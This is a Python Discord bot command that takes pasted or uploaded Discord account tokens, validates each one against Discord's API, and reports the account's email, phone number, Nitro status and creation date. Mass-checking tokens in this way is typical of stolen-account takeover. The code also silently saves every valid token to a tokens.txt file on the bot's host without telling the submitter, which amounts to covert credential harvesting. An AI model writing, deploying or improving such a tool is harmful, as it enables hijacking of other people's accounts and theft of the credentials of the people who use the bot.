
import discord
import requests
import asyncio
from datetime import datetime
import os


def check(bot):

    def update_tokens_file(username, token):
        """Updates the tokens.txt file, ensuring no duplicates and replacing old tokens."""
        tokens_dict = {}

        # Read existing tokens from the file
        if os.path.exists("tokens.txt"):
            with open("tokens.txt", "r") as file:
                for line in file:
                    name, old_token = line.strip().split(" : ", 1)
                    tokens_dict[name] = old_token

        # Update or add the new token
        tokens_dict[username] = token

        # Write updated tokens back to the file
        with open("tokens.txt", "w") as file:
            for name, token in tokens_dict.items():
                file.write(f"{name} : {token}\n")

    @bot.command(aliases=["ct"])
    async def checktokens(ctx):

        if not isinstance(ctx.message.channel, discord.DMChannel):
            await ctx.author.send("Please send `&check_tokens` or `&ct` here in DM to check your tokens.")
            await ctx.send("Check your DMs to proceed.")
            return

        await ctx.send("Please send your tokens, one per line, or upload a file containing tokens. Type `done` when you're finished.")

        def check_message(message):
            return message.author == ctx.author and isinstance(message.channel, discord.DMChannel)

        tokens = []

        while True:
            try:
                message = await bot.wait_for('message', check=check_message, timeout=60)

                if message.content.lower() == "done":
                    break

                if message.attachments:
                    # Handle file uploads
                    file = message.attachments[0]
                    await file.save("uploaded_tokens.txt")

                    with open("uploaded_tokens.txt", "r") as f:
                        tokens.extend(line.strip() for line in f.readlines())

                    os.remove("uploaded_tokens.txt")
                else:
                    tokens.extend(message.content.splitlines())

            except asyncio.TimeoutError:
                await ctx.author.send("You took too long to respond. Please try again.")
                return

        if not tokens:
            await ctx.author.send("No tokens provided. Please try again.")
            return

        token_data = {}
        invalid_tokens = []

        for token in tokens:
            token = token.strip()
            if not token:
                continue

            headers = {'Authorization': token}
            response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)

            if response.status_code == 200:
                user_info = response.json()
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_info['id']}/{user_info['avatar']}.png?size=1024"
                nitro_status = "Yes" if user_info.get("premium_type") else "No"
                creation_date = datetime.utcfromtimestamp(((int(user_info['id']) >> 22) + 1420070400000) / 1000)

                embed = discord.Embed(
                    title="Token Checked Successfully",
                    color=discord.Color.green()
                )
                embed.add_field(name="Token", value=f"```{token}```", inline=False)
                embed.add_field(name="Username", value=user_info["username"], inline=True)
                embed.add_field(name="User ID", value=user_info["id"], inline=True)
                embed.add_field(name="Email", value=user_info["email"], inline=True)
                embed.add_field(name="Phone Number", value=user_info.get("phone", "Not linked"), inline=True)
                embed.add_field(name="Nitro", value=nitro_status, inline=True)
                embed.add_field(name="Creation Date", value=creation_date.strftime('%Y-%m-%d %H:%M:%S UTC'), inline=True)
                embed.set_thumbnail(url=avatar_url)

                await ctx.author.send(embed=embed)
                token_data[user_info["username"]] = token

                # Update the tokens.txt file
                update_tokens_file(user_info["username"], token)

                print("[+] Token Checked ✅")
            else:
                invalid_tokens.append(token)
                embed = discord.Embed(
                    title="Invalid Token",
                    color=discord.Color.red()
                )
                embed.add_field(name="Token", value=f"```{token}```", inline=False)
                embed.set_footer(text="Please ensure the token is correct and try again.")
                await ctx.author.send(embed=embed)
                print(f"[ERROR] Invalid Token: {token}")


        # Ask if the user wants valid tokens in a file
        if token_data:
            await ctx.author.send("Would you like to receive the valid tokens in a file? (yes/no)")

            try:
                response = await bot.wait_for('message', check=check_message, timeout=60)
                if response.content.lower() == 'yes':
                    valid_tokens_message = "\n".join(token_data.values())
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    valid_tokens_filename = f"valid_tokens_{timestamp}.txt"

                    with open(valid_tokens_filename, "w") as file:
                        file.write(valid_tokens_message)

                    await ctx.author.send(file=discord.File(valid_tokens_filename))
                    os.remove(valid_tokens_filename)
                    await ctx.author.send("Valid tokens have been sent as a file.")
                else:
                    await ctx.author.send("No file was sent.")
            except asyncio.TimeoutError:
                await ctx.author.send("You took too long to respond. No file was sent.")
